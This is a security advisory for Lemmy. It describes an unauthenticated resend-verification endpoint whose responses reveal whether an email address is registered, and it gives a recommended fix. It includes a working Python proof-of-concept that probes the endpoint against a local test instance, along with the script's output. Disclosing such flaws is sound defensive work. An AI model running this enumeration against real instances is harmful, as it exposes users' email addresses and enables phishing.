# [M] Lemmy resend-verification endpoint exposes registered email addresses to unauthenticated users

## Summary
Severity: Medium
Advisory: GHSA-qxrw-f6fh-34r7
CWE: CWE-204
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-qxrw-f6fh-34r7
Type: github-advisory

## Affected
- crates.io: `lemmy_api` — affected >=0

## Details
## Summary

The unauthenticated resend-verification endpoint returns different responses for registered and unregistered email addresses. A malicious third party can submit candidate addresses to `/api/v4/account/auth/resend_verification_email` and distinguish accounts from misses.

## Details

`resend_verification_email()` looks up the submitted address and returns the lookup error to the caller:

```rust
let local_user_view = LocalUserView::find_by_email(&mut context.pool(), &email).await?;
check_local_user_valid(&local_user_view)?;
```

The password reset endpoint already uses a safer pattern. It discards lookup errors and returns success, which prevents the same account-discovery channel.

## Proof of Concept

The following script creates one user and probes that address plus a missing address.

```python
import requests, random, string

BASE = "http://127.0.0.1:8536/api/v4"  # change to the target Lemmy URL
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"
PASSWORD = "Password123456!"

def post(path, **body):
    return requests.post(BASE + path, json=body)

suffix = "enum" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
admin = post("/account/auth/login", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()["jwt"]
requests.put(BASE + "/site", headers={"Authorization": "Bearer " + admin},
             json={"registration_mode": "open", "email_verification_required": False})

email = "alice" + suffix + "@example.test"
post("/account/auth/register", username="alice" + suffix, password=PASSWORD,
     password_verify=PASSWORD, email=email).raise_for_status()

for candidate in [email, "missing" + suffix + "@example.test"]:
    r = post("/account/auth/resend_verification_email", email=candidate)
    print(candidate, "HTTP", r.status_code, r.text[:300])

```

Output:

```text
alicepoceudtpf@example.test HTTP 200 {"success":true}
missingpoceudtpf@example.test HTTP 404 {"error":"not_found","cause":"Record not found"}
```

## Impact

A malicious third party can enumerate registered email addresses without authentication. The endpoint uses the registration rate limit bucket, not an endpoint-specific anti-enumeration limit, so the attacker can automate probes across candidate address lists. The response also distinguishes missing accounts from banned or deleted accounts because `check_local_user_valid()` returns separate error types.

## Recommended Fix

Use the password-reset pattern for resend verification. Move the lookup and email-send work into a helper, ignore helper errors in the handler, and always return `{"success": true}` for syntactically valid input.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-qxrw-f6fh-34r7
- https://github.com/LemmyNet/lemmy/commit/4afff1699d08920b9a9023e81b229d772b894d91
- https://github.com/LemmyNet/lemmy
